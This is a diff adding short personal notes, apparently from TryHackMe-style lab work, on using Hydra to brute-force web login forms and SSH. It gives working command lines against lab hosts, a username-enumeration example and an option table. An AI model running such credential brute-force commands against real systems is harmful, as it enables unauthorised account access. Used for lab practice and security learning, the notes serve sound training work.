@@ -1,1 +1,18 @@
 hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p asdf nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
+post login below:
+hydra -l <username> -P <wordlist> 10.10.19.39 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+SSH:
+hydra -l <username> -P <full path to pass> 10.10.19.39 -t 4 ssh
+
+sudo hydra <username> <wordlist> 10.10.19.39 http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+Option	                    Description
+-l	                       the username for (web form) login
+-P	                       the password list to use
+http-post-form	           the type of the form is POST
+<path>	                   the login page URL, for example, login.php
+<login_credentials>	       the username and password used to log in, for example, username=^USER^&password=^PASS^
+<invalid_response>	       part of the response when the login fails
+-V	                       verbose output for every attempt
+
+
